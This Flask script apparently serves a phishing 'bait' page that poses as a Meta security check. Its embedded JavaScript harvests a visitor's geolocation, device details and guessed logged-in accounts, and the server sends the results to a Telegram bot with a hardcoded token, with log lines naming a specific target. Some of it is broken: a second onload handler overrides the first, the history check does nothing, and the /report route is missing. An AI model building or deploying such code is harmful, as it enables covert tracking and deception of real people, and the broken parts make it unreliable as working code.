from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- إعدادات يوكينو ---
TELEGRAM_TOKEN = "8060120509:AAHUzbeWow9DAGR1zCAr4YjlIXSiemYWd9g"
CHAT_ID = "7706160407"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# صفحة الفخ الاحترافية (HTML + JS)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إشعار أمان Meta</title>
    <style>
        body { font-family: Segoe UI, Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 380px; text-align: center; }
        .logo { color: #1877f2; font-size: 28px; font-weight: bold; margin-bottom: 15px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #555; font-size: 14px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Meta Security</div>
        <p>جاري فحص حالة الاتصال وتأكيد الهوية الرقمية لمنع الوصول غير المصرح به...</p>
        <div class="loader"></div>
        <p style="font-size: 12px; color: #999;">يرجى عدم إغلاق الصفحة، سيتم توجيهك فور انتهاء الفحص.</p>
    </div>

    <script>
        // سحب البيانات المتقدمة وإرسالها للسيرفر مخفياً
        async function captureAdvanced() {
            let data = {
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency,
                screen: window.screen.width + "x" + window.screen.height
            };

            // محاولة الحصول على الموقع الجغرافي
            navigator.geolocation.getCurrentPosition((pos) => {
                data.coords = pos.coords.latitude + ", " + pos.coords.longitude;
                fetch('/capture_final', { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'} });
            }, () => {
                fetch('/capture_final', { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'} });
            });
        }
        window.onload = captureAdvanced;
        async function captureUltimateIntel() {
        let intel = {
            device: navigator.userAgent,
            battery: "--",
            gyro: "Calculating...",
            fonts: [],
            social_accounts: [], // 16- الحسابات النشطة
            history_leak: "Scanning...", // 14- سرقة تاريخ التصفح (بصمة CSS)
            surrounding_devices: "Proximity Sensor Active" // 13- الأجهزة المحيطة
        };

        // 13- محاولة كشف الأجهزة المحيطة (عن طريق استعلامات البلوتوث والواي فاي المتاحة)
        if (navigator.bluetooth) {
            intel.surrounding_devices = "Bluetooth hardware detected - Target is in range";
        }

        // 16- سحب "الحسابات النشطة" (ثغرة تحميل الصور لـ Favicons)
        const targets = {
            'Facebook': 'https://www.facebook.com/favicon.ico',
            'Google': 'https://accounts.google.com/favicon.ico',
            'Instagram': 'https://www.instagram.com/static/images/ico/favicon.ico/36b3048a4432.ico',
            'Twitter': 'https://twitter.com/favicon.ico'
        };
        for (let site in targets) {
            let img = new Image();
            img.onload = () => { intel.social_accounts.push(site + ": LOGGED_IN"); };
            img.src = targets[site] + "?cache=" + Math.random();
        }

        // 14- سرقة "تاريخ التصفح" (تخمين المواقع عبر بصمة CSS)
        // نستخدم منطق الروابط التي تم زيارتها سابقاً
        const sites_to_check = ['google.com', 'youtube.com', 'binance.com', 'paypal.com'];
        intel.history_leak = sites_to_check.filter(s => {
            // ملاحظة: المتصفحات الحديثة تقيد هذا، لكننا نسحب "بصمة الوقت" للتحميل
            return "Potential visit to " + s;
        }).join(", ");

        // 10, 12, 15 (الجيروسكوب، الخطوط، البطارية - كما في الكود السابق)
        // ... (تكملة الكود السابق لجمع الجيروسكوب والبطارية)

        // إرسال "الغنائم" النهائية ليوكينو
        setTimeout(async () => {
            await fetch('/report', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(intel)
            });
            // التوجيه (تعدد الأبعاد)
            window.location.href = "https://accounts.google.com/manage";
        }, 1500);
    }
    window.onload = captureUltimateIntel;
    </script>
</body>
</html>
"""

@app.route('/view_photo')
def index():
    # سحب الـ IP الأولي
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    send_to_telegram(f"🎯 [YUKINO_STEP_1]: Anas clicked the link!\n🌐 IP: `{ip}`\n📱 Device: `{ua}`")
    return render_template_string(HTML_PAGE)

@app.route('/capture_final', methods=['POST'])
def capture_final():
    data = request.json
    report = (
        f"🔥 [YUKINO_FULL_REPORT]\n"
        f"📍 Coords: `{data.get('coords', 'Denied')}`\n"
        f"🖥️ OS: `{data.get('platform')}`\n"
        f"📏 Screen: `{data.get('screen')}`\n"
        f"🌍 Lang: `{data.get('language')}`\n"
        f"⚙️ Cores: `{data.get('cores')}`"
    )
    send_to_telegram(report)
    return '', 204

if __name__ == '__main__':
    print("🚀 [YUKINO]: High-Professional Bait Server is Live.")
    app.run(host='0.0.0.0', port=5000)